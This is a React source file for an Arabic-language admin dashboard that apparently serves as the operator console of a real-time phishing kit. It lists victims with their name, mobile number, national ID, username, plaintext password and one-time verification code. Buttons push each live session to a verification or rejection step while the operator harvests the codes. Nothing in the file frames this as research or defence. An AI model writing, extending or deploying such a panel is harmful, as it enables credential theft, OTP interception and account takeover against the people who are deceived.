import { useMemo, useState } from 'react';
import { ChevronDown, History, Wifi, WifiOff, Home as HomeIcon, KeyRound, ShieldCheck, Loader2, Clock, User, CheckCircle, XCircle, Search } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { useAdminRealtime, type ClientState, type ClientStage, type StageLogEntry } from '@/hooks/useAdminRealtime';
import { AdminLayout } from '@/components/layout/AdminLayout';

const STAGE_LABEL: Record<string, string> = {
  home: 'الرئيسية',
  signup: 'التسجيل',
  create_account: 'إنشاء الحساب',
  pending_approval: 'قيد المراجعة',
  verify: 'رمز التحقق',
};

const STAGE_ORDER = ['home', 'signup', 'create_account', 'pending_approval', 'verify'];

function formatTime(iso: string | null): string {
  if (!iso) return '—';
  const date = new Date(iso);
  return date.toLocaleString('ar-EG', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' });
}

function HistoryModal({
  open,
  onOpenChange,
  sessionId,
  stage,
  requestHistory,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  sessionId: string;
  stage: string;
  requestHistory: (sessionId: string, stage: string) => Promise<StageLogEntry[]>;
}) {
  const [logs, setLogs] = useState<StageLogEntry[] | null>(null);
  const [loading, setLoading] = useState(false);

  const load = () => {
    setLoading(true);
    setLogs(null);
    requestHistory(sessionId, stage).then((result) => {
      setLogs(result);
      setLoading(false);
    });
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-lg" dir="rtl">
        <DialogHeader>
          <DialogTitle>سجل {STAGE_LABEL[stage] ?? stage}</DialogTitle>
          <DialogDescription>البيانات القديمة التي تم إدخالها لهذا العميل في هذه الخطوة</DialogDescription>
        </DialogHeader>
        <div className="max-h-96 overflow-y-auto space-y-3 mt-2">
          {loading && (
            <div className="flex items-center justify-center py-10 text-muted-foreground gap-2">
              <Loader2 className="w-5 h-5 animate-spin" />
              جارِ التحميل...
            </div>
          )}
          {!loading && logs && logs.length === 0 && (
            <p className="text-center text-muted-foreground py-10">لا يوجد سجل سابق لهذه الخطوة</p>
          )}
          {!loading && logs?.map((log) => (
            <div key={log.id} className="rounded-xl border border-border bg-muted/30 p-4 space-y-2">
              <div className="flex items-center gap-2 text-xs text-muted-foreground">
                <Clock className="w-3.5 h-3.5" />
                {formatTime(log.createdAt)}
              </div>
              <div className="grid grid-cols-1 gap-1 text-sm">
                {Object.entries(log.payload).map(([key, value]) => (
                  <div key={key} className="flex items-center justify-between gap-3">
                    <span className="text-muted-foreground">{key}</span>
                    <span dir="ltr" className="font-mono text-foreground">{String(value)}</span>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      </DialogContent>
    </Dialog>
  );
}

function ClientCard({
  client,
  requestHistory,
  sendRedirect,
}: {
  client: ClientState;
  requestHistory: (sessionId: string, stage: string) => Promise<StageLogEntry[]>;
  sendRedirect: (sessionId: string, target: ClientStage) => void;
}) {
  const [expanded, setExpanded] = useState(false);
  const [historyStage, setHistoryStage] = useState<string | null>(null);
  const isOnline = client.status === 'online';
  const displayName = client.fullName?.trim() || 'عميل بدون اسم بعد';
  const stageIndex = STAGE_ORDER.indexOf(client.stage);

  return (
    <div className="rounded-2xl border border-border bg-card overflow-hidden transition-all shadow-sm">
      <button
        type="button"
        onClick={() => setExpanded((v) => !v)}
        className="w-full flex items-center justify-between gap-4 p-4 md:p-5 text-right hover:bg-muted/30 transition-colors"
      >
        <div className="flex items-center gap-3 md:gap-4 min-w-0">
          <div className="relative shrink-0">
            <div className="w-10 h-10 md:w-11 md:h-11 rounded-full bg-primary/10 flex items-center justify-center">
              <User className="w-5 h-5 text-primary" />
            </div>
            <span className={`absolute -bottom-0.5 -left-0.5 w-3 h-3 md:w-3.5 md:h-3.5 rounded-full border-2 border-card ${isOnline ? 'bg-emerald-500' : 'bg-zinc-500'}`} />
          </div>
          <div className="min-w-0 text-right">
            <p className="font-semibold text-foreground truncate text-sm md:text-base">{displayName}</p>
            <div className="flex items-center gap-1 md:gap-2 text-xs text-muted-foreground mt-0.5">
              <span className={`inline-flex items-center gap-1 ${isOnline ? 'text-emerald-500' : 'text-zinc-500'}`}>
                {isOnline ? <Wifi className="w-3 h-3" /> : <WifiOff className="w-3 h-3" />}
                <span className="hidden sm:inline">{isOnline ? 'نشط الآن' : 'غير نشط'}</span>
              </span>
              <span className="hidden sm:inline">•</span>
              <span className="hidden xs:inline">آخر ظهور {formatTime(client.lastSeenAt ?? client.updatedAt)}</span>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-2 md:gap-3 shrink-0">
          <span className="text-xs md:text-sm font-medium px-2 md:px-3 py-1.5 rounded-full bg-primary/10 text-primary whitespace-nowrap">
            {STAGE_LABEL[client.stage] ?? client.stage}
          </span>
          <ChevronDown className={`w-4 h-4 md:w-5 md:h-5 text-muted-foreground transition-transform ${expanded ? 'rotate-180' : ''}`} />
        </div>
      </button>

      {/* Stage progress */}
      <div className="px-4 md:px-5 pb-3 md:pb-4 flex items-center gap-1.5" dir="ltr">
        {STAGE_ORDER.map((s, i) => (
          <div key={s} className={`h-1.5 flex-1 rounded-full ${i <= stageIndex ? 'bg-primary' : 'bg-border'}`} />
        ))}
      </div>

      {expanded && (
        <div className="border-t border-border p-4 md:p-5 space-y-4 md:space-y-5 bg-muted/10 animate-in slide-in-from-top-2 duration-300">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
            <DataBox
              title="بيانات التسجيل"
              fields={[
                { label: 'الاسم الكامل', value: client.fullName },
                { label: 'رقم الموبايل', value: client.mobile, ltr: true },
                { label: 'الرقم القومي', value: client.nationalId, ltr: true },
              ]}
              onHistory={() => setHistoryStage('signup')}
            />
            <DataBox
              title="بيانات الحساب"
              fields={[
                { label: 'اسم المستخدم', value: client.username, ltr: true },
                { label: 'كلمة المرور', value: client.password, ltr: true },
              ]}
              onHistory={() => setHistoryStage('create_account')}
            />
            <DataBox
              title="رمز التحقق"
              fields={[{ label: 'رمز التحقق', value: client.verificationCode, ltr: true }]}
              onHistory={() => setHistoryStage('verify')}
            />
          </div>

          <div className="space-y-2">
            <p className="text-sm font-medium text-muted-foreground">الإجراءات السريعة</p>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2">
              <Button variant="outline" className="gap-2 h-11 text-sm" onClick={() => sendRedirect(client.sessionId, 'home')}>
                <HomeIcon className="w-4 h-4" />
                <span>العودة للرئيسية</span>
              </Button>
              <Button variant="outline" className="gap-2 h-11 text-sm" onClick={() => sendRedirect(client.sessionId, 'create_account')}>
                <KeyRound className="w-4 h-4" />
                <span>تحويل للتسجيل</span>
              </Button>
              <Button variant="outline" className="gap-2 h-11 text-sm" onClick={() => sendRedirect(client.sessionId, 'verify')}>
                <ShieldCheck className="w-4 h-4" />
                <span>تحويل للتحقق</span>
              </Button>
            </div>
          </div>

          {/* أزرار الموافقة/الرفض */}
          {client.stage === 'pending_approval' && (
            <div className="space-y-2 pt-4 border-t border-border">
              <p className="text-sm font-medium text-muted-foreground">إجراءات التحقق من البيانات</p>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <Button className="gap-2 h-12 bg-emerald-500 hover:bg-emerald-600 text-white text-sm" onClick={() => sendRedirect(client.sessionId, 'verify')}>
                  <CheckCircle className="w-5 h-5" />
                  <span>موافق - تحويل للتحقق</span>
                </Button>
                <Button variant="destructive" className="gap-2 h-12 text-sm" onClick={() => sendRedirect(client.sessionId, 'rejected')}>
                  <XCircle className="w-5 h-5" />
                  <span>مرفوض - إعادة المحاولة</span>
                </Button>
              </div>
            </div>
          )}
        </div>
      )}

      {historyStage && (
        <HistoryModal
          open
          onOpenChange={(open) => !open && setHistoryStage(null)}
          sessionId={client.sessionId}
          stage={historyStage}
          requestHistory={requestHistory}
        />
      )}
    </div>
  );
}

function DataBox({
  title,
  fields,
  onHistory,
}: {
  title: string;
  fields: { label: string; value: string | null; ltr?: boolean }[];
  onHistory: () => void;
}) {
  return (
    <div className="rounded-xl border border-border bg-card p-3 md:p-4 flex flex-col gap-2 md:gap-3">
      <p className="text-sm font-medium text-foreground">{title}</p>
      <div className="space-y-1.5 md:space-y-2">
        {fields.map((f) => (
          <div key={f.label} className="flex items-center justify-between gap-2 md:gap-3">
            <span className="text-xs md:text-sm text-muted-foreground shrink-0">{f.label}</span>
            <span dir={f.ltr ? 'ltr' : undefined} className={`text-xs md:text-sm text-foreground truncate ${f.ltr ? 'font-mono' : 'font-medium'}`}>
              {f.value?.trim() ? f.value : '—'}
            </span>
          </div>
        ))}
      </div>
      <Button variant="ghost" size="sm" className="gap-2 justify-center mt-1 text-xs md:text-sm" onClick={onHistory}>
        <History className="w-3.5 h-3.5 md:w-4 md:h-4" />
        السجل
      </Button>
    </div>
  );
}

export default function Admin() {
  const { clients, status, requestHistory, sendRedirect } = useAdminRealtime();
  const [search, setSearch] = useState('');

  const filtered = useMemo(() => {
    if (!search.trim()) return clients;
    const q = search.trim().toLowerCase();
    return clients.filter((c) =>
      [c.fullName, c.mobile, c.nationalId, c.username].some((v) => v?.toLowerCase().includes(q)),
    );
  }, [clients, search]);

  const onlineCount = clients.filter((c) => c.status === 'online').length;

  return (
    <AdminLayout>
      <div className="space-y-4 md:space-y-6">
        {/* Stats Header */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div className="flex items-center gap-2">
            <div className={`flex items-center gap-2 px-3 py-1.5 rounded-full text-xs md:text-sm font-medium ${status === 'online' ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
              {status === 'online' ? <Wifi className="w-3 h-3 md:w-4 md:h-4" /> : <Loader2 className="w-3 h-3 md:w-4 md:h-4 animate-spin" />}
              <span>{status === 'online' ? 'متصل' : 'جارِ الاتصال...'}</span>
            </div>
          </div>
          <p className="text-xs md:text-sm text-muted-foreground">
            إجمالي الطلبات: <span className="font-semibold text-foreground">{clients.length}</span>
            {' '}-{' '}
            نشط الآن: <span className="font-semibold text-emerald-500">{onlineCount}</span>
          </p>
        </div>

        {/* Search */}
        <div className="relative">
          <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 md:w-5 md:h-5 text-muted-foreground" />
          <Input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="بحث بالاسم أو الموبايل أو الرقم القومي..."
            className="pr-10 h-11 md:h-12 text-sm"
          />
        </div>

        {/* Empty State */}
        {filtered.length === 0 && (
          <div className="rounded-2xl border border-dashed border-border p-8 md:p-16 text-center text-muted-foreground">
            <div className="flex flex-col items-center gap-3">
              <div className="w-12 h-12 md:w-16 md:h-16 rounded-full bg-muted flex items-center justify-center">
                <User className="w-6 h-6 md:w-8 md:h-8 text-muted-foreground/50" />
              </div>
              <p className="text-sm md:text-base">لا يوجد عملاء حالياً</p>
              <p className="text-xs md:text-sm text-muted-foreground/70">سيظهر أي عميل يبدأ التفعيل هنا مباشرة.</p>
            </div>
          </div>
        )}

        {/* Client List */}
        <div className="space-y-3 md:space-y-4">
          {filtered.map((client) => (
            <ClientCard
              key={client.sessionId}
              client={client}
              requestHistory={requestHistory}
              sendRedirect={sendRedirect}
            />
          ))}
        </div>
      </div>
    </AdminLayout>
  );
}
